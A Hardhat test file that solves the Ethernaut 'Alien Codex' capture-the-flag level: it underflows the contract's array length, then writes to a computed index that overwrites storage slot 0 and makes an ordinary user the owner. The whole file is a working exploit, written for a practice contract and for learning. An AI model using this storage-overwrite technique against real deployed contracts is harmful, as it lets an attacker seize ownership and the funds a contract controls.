const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Nineteen", function () {
  async function deployToken() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautNineteenAlienCodex = await ethers.getContractFactory(
      "EthernautNineteenAlienCodex"
    );
    const ethernautNineteenAlienCodex =
      await EthernautNineteenAlienCodex.deploy();
    await ethernautNineteenAlienCodex.deployed();

    return {
      deployer,
      user1,
      ethernautNineteenAlienCodex,
    };
  }

  describe("Exploit", function () {
    it("Successfully took over ownership", async function () {
      const { deployer, user1, ethernautNineteenAlienCodex } =
        await loadFixture(deployToken);

      expect(
        await ethernautNineteenAlienCodex.connect(deployer).isOwner()
      ).to.equal(true);
      expect(
        await ethernautNineteenAlienCodex.connect(user1).isOwner()
      ).to.equal(false);

      const reviseIndex =
        BigInt(ethers.constants.MaxUint256) -
        BigInt(ethers.utils.keccak256(ethers.utils.hexZeroPad(1, 32))) +
        1n;

      await ethernautNineteenAlienCodex.connect(user1).make_contact();
      await ethernautNineteenAlienCodex.connect(user1).retract();

      await ethernautNineteenAlienCodex
        .connect(user1)
        .revise(
          reviseIndex,
          `0x000000000000000000000001${user1.address.slice(2)}`
        );

      expect(
        await ethernautNineteenAlienCodex.connect(deployer).isOwner()
      ).to.equal(false);
      expect(
        await ethernautNineteenAlienCodex.connect(user1).isOwner()
      ).to.equal(true);
    });
  });
});
